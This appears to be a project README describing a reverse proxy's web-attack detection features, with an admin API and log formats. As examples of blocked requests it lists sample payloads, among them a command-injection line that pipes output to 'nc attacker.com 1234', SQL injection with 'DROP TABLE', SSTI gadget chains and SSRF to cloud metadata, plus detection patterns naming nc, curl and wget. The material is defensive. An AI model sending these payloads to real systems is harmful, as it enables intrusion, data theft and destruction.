# Security Features

This reverse proxy server is equipped with enterprise-level security features. All security mechanisms are optimized to operate without compromising user experience.

## 🛡️ Comprehensive Security Layers

### 1. **Directory Traversal Protection** ✅
Detects and blocks path traversal attacks.

**Detected Patterns:**
- `../` and `..\ ` combinations
- URL encoded path traversal (`%2e%2e%2f`)
- Mixed encoding techniques
- System file access attempts (`/etc/passwd`, `/windows/win.ini`)
- Process information access (`/proc/self`)

**Example Blocked Requests:**
```
GET /api/../../../../etc/passwd
GET /files/..%2f..%2f..%2fetc%2fpasswd
GET /download?file=../../config.json
```

---

### 2. **SQL Injection Protection** ✅
Detects all SQL injection variants.

**Detected Techniques:**
- Classic SQL injection (`' OR '1'='1`)
- UNION-based injection
- Time-based blind injection (`SLEEP`, `BENCHMARK`, `WAITFOR`)
- Stacked queries
- SQL comments (`--`, `/* */`)
- Database command execution (`xp_cmdshell`, `shutdown`)

**Example Blocked Requests:**
```
GET /user?id=1' UNION SELECT * FROM users--
POST /login username=' OR 1=1-- &password=x
GET /search?q=1'; DROP TABLE users;--
```

---

### 3. **NoSQL Injection Protection** ✅
Blocks injection attacks targeting MongoDB and other NoSQL databases.

**Detected Patterns:**
- MongoDB operators (`$where`, `$ne`, `$gt`, `$regex`)
- Object injection (`{"$ne": null}`)
- Query manipulation

**Example Blocked Requests:**
```
POST /api/users {"username": {"$ne": null}, "password": {"$ne": null}}
GET /search?filter[$where]=function(){return true}
```

---

### 4. **XSS (Cross-Site Scripting) Protection** ✅
Blocks Stored, Reflected, and DOM-based XSS attacks.

**Detected Patterns:**
- `<script>` tags
- Event handlers (`onclick`, `onerror`, `onload`)
- JavaScript protocol (`javascript:`)
- Data URIs (`data:text/html`)
- HTML injection (`<iframe>`, `<embed>`, `<object>`)
- DOM manipulation (`document.cookie`, `window.location`)

**Example Blocked Requests:**
```
GET /search?q=<script>alert('XSS')</script>
GET /profile?name=<img src=x onerror=alert(1)>
POST /comment content=<svg onload=alert(document.cookie)>
```

---

### 5. **Command Injection Protection** ✅
Detects operating system command injections.

**Detected Techniques:**
- Shell metacharacters (`;`, `|`, `&`, `` ` ``)
- Command substitution (`$(cmd)`, `` `cmd` ``)
- Command chaining (`&&`, `||`)
- System binaries (`bash`, `sh`, `nc`, `curl`, `wget`)

**Example Blocked Requests:**
```
GET /ping?host=localhost; cat /etc/passwd
POST /exec cmd=`whoami`
GET /download?file=test.txt|nc attacker.com 1234
```

---

### 6. **Server-Side Template Injection (SSTI) Protection** ✅
Blocks template engine attacks.

**Detected Patterns:**
- Jinja2/Flask templates (`{{`, `{%`)
- JSP/Spring EL (`${}`)
- Ruby interpolation (`#{}`)
- Razor syntax (`@{}`)
- Constructor access, dunder methods

**Example Blocked Requests:**
```
GET /render?template={{7*7}}
POST /page content={{config.__class__.__init__.__globals__}}
GET /view?tmpl={{''.constructor.constructor('return process')()}}
```

---

### 7. **Server-Side Request Forgery (SSRF) Protection** ✅
Blocks access to internal networks and metadata endpoints.

**Detected Targets:**
- Localhost (`127.0.0.1`, `::1`, `localhost`)
- Private networks (`192.168.x.x`, `10.x.x.x`, `172.16-31.x.x`)
- AWS metadata (`169.254.169.254`)
- GCP metadata (`metadata.google.internal`)
- File protocols (`file://`, `gopher://`, `dict://`)

**Example Blocked Requests:**
```
POST /fetch url=http://127.0.0.1:8080/admin
GET /proxy?url=http://169.254.169.254/latest/meta-data
POST /image url=file:///etc/passwd
```

---

### 8. **Scanning & Enumeration Detection** ✅
Detects directory and subdomain scanning operations.

**Detection Criteria:**
- High unique path ratio (>80%)
- High request rate (>10 req/sec)
- Common scan paths (`/admin`, `/.git`, `/.env`, `/phpmyadmin`)
- Systematic path exploration
- 404 rate

**Smart Detection:**
- Normal users browsing the site are not banned
- Only **superhuman speeds** and **systematic scans** are detected
- Behavioral scoring system prevents false positives

---

### 9. **Brute Force Protection** ✅
Blocks brute force attacks on login and authentication endpoints.

**Detection Mechanism:**
- Auto-detects login endpoints (`/login`, `/signin`, `/auth`)
- **Human-friendly limits:**
  - Maximum 5 attempts/minute
  - Maximum 15 attempts/5 minutes
- IP-based tracking
- Credential stuffing protection

**Covered Endpoints:**
```
/login, /signin, /auth, /authenticate
/api/login, /api/auth, /oauth
Custom authentication endpoints
```

---

### 10. **Bot Detection** ✅
Detects automated bots while **not banning fast-browsing real users**.

**Human vs Bot Distinction:**

✅ **Allowed (Normal):**
- Fast page transitions (>100ms intervals)
- Real user-agents
- Natural browsing patterns
- Timing variance

❌ **Blocked:**
- **Superhuman speeds** (<50ms between requests)
- Missing or bot user-agent
- Very consistent timing (variance <100ms)
- Automated script patterns

**Bot Scoring System:**
```javascript
// Superhuman speed: 3+ requests with <50ms intervals
// Bot user-agent: curl, wget, python-requests, etc.
// No user-agent: Missing User-Agent header
// Consistent timing: Very regular request timing
```

---

### 11. **Information Gathering Detection** ✅
Detects active information gathering attempts.

**Monitored Endpoints:**
- `/robots.txt`, `/sitemap.xml`
- `/.well-known/*`
- `/swagger`, `/api/docs`, `/graphql`
- `/version`, `/status`, `/health`
- `/.git/config`, `/.env`, `/package.json`

**Detection Criteria:**
- 3+ info gathering endpoint accesses = suspicious
- Logged and scored

---

### 12. **CSRF (Cross-Site Request Forgery) Protection** ✅
CSRF token validation for state-changing requests.

**Features:**
- Crypto-secure token generation
- Session-based token storage
- Token validation API
- Automatic token rotation

**Usage:**
```javascript
// Token generation
const token = advancedSecurity.generateCSRFToken();

// Token validation
const isValid = advancedSecurity.validateCSRFToken(token, sessionId);
```

---

### 13. **File Upload Validation** ✅
Closes unrestricted file upload vulnerabilities.

**Checks:**
- **Dangerous extension blocking:**
  - Executables: `.exe`, `.dll`, `.bat`, `.sh`
  - Server-side scripts: `.php`, `.asp`, `.jsp`
  - Config files: `.htaccess`, `.ini`, `.config`
  
- **MIME type validation:**
  - Extension-mimetype matching
  - Content-type spoofing detection
  
- **Double extension check:**
  - Blocks bypass attempts like `shell.php.jpg`

---

### 14. **IDOR (Insecure Direct Object Reference) Protection** ✅
Detects systematic ID scanning operations.

**Detection Mechanism:**
- Sequential ID access patterns
- High-speed ID enumeration
- Authorization bypass attempts

---

## 📊 Threat Scoring System

A threat score is calculated for each request:

```
Critical (100+)  → Immediate ban
High (70-99)     → Request blocked, multiple violations = ban
Medium (40-69)   → Logged and tracked
Low (<40)        → Monitored
```

**Severity Levels:**
- **Critical:** SQL Injection, Command Injection, SSTI
- **High:** XSS, NoSQL Injection, SSRF, Brute Force, Directory Traversal
- **Medium:** Scanning, Bot Activity
- **Low:** Information Gathering

---

## 🎯 User Experience Focused Approach

### ✅ For Normal Users
- **Fast browsing is not blocked**
- **Multiple tabs don't cause issues**
- **Legitimate API requests are unaffected**
- **False positives at minimum**

### ❌ For Attackers
- **Automated scans are blocked**
- **Bot traffic is filtered**
- **Injection attempts are blocked**
- **Brute force attacks are stopped**

---

## 📡 Admin API - Security Endpoints

### 1. Security Statistics
```bash
GET /api/security/stats
Authorization: Bearer YOUR_TOKEN
```

**Response:**
```json
{
  "trackedIPs": 150,
  "activeLoginAttempts": 5,
  "csrfTokens": 42,
  "timestamp": "2024-01-01T12:00:00Z",
  "securityFeatures": {
    "directoryTraversal": "enabled",
    "sqlInjection": "enabled",
    "nosqlInjection": "enabled",
    "xss": "enabled",
    "commandInjection": "enabled",
    "ssti": "enabled",
    "ssrf": "enabled",
    "scanningDetection": "enabled",
    "bruteForceProtection": "enabled",
    "botDetection": "enabled"
  }
}
```

### 2. Recent Threats
```bash
GET /api/security/threats
Authorization: Bearer YOUR_TOKEN
```

**Response:**
```json
{
  "totalThreats": 15,
  "threats": [
    {
      "ip": "192.168.1.100",
      "threats": [
        {
          "type": "sql_injection",
          "severity": "critical",
          "pattern": "/union.*select/gi"
        }
      ],
      "scanScore": 85,
      "requestCount": 150,
      "isBot": true,
      "lastActivity": "2024-01-01T12:00:00Z"
    }
  ]
}
```

### 3. Clear Behavior Data
```bash
POST /api/security/clear-behavior
Authorization: Bearer YOUR_TOKEN
Content-Type: application/json

{
  "ip": "192.168.1.100"
}
```

---

## 🔍 Monitoring & Logging

All security events are logged in detail:

```json
{
  "level": "error",
  "message": "Request blocked by advanced security",
  "ip": "192.168.1.100",
  "reason": "Suspicious request blocked",
  "threats": [
    {
      "type": "sql_injection",
      "severity": "critical",
      "detected": true,
      "pattern": "/union.*select/gi",
      "location": "/api/users?id=1' UNION SELECT"
    }
  ],
  "threatScore": 100,
  "host": "example.com",
  "url": "/api/users?id=1' UNION SELECT * FROM users--",
  "method": "GET",
  "userAgent": "curl/7.68.0"
}
```

---

## ⚙️ Configuration

All security features are controlled via `src/configs.json`:

```json
{
  "firewall": {
    "enabled": true,
    "rateLimit": 100,
    "rateLimitWindow": 60000
  }
}
```

**Note:** When `firewall.enabled = true`, all advanced security features are automatically activated.

---

## 🚨 Security Recommendations

1. **Always keep the firewall enabled**
2. **Review logs regularly**
3. **Manually check IPs with high threat scores**
4. **Make Admin API accessible only from trusted IPs**
5. **Use HTTPS**
6. **Follow security updates**

---

## 📈 Performance

All security checks operate with **minimal latency**:
- Pattern matching: ~1-2ms
- Behavioral analysis: ~0.5-1ms
- Total overhead: ~2-4ms per request

**Production-ready** and optimized for **high-traffic** environments.

---

## 🤝 Reporting

If you discover a security vulnerability, please practice **responsible disclosure**:
1. Report immediately (do not make public disclosure)
2. Provide detailed PoC
3. You will receive a response within 48 hours

---

**Enterprise Security. Zero Compromise. Maximum Performance.** 🛡️
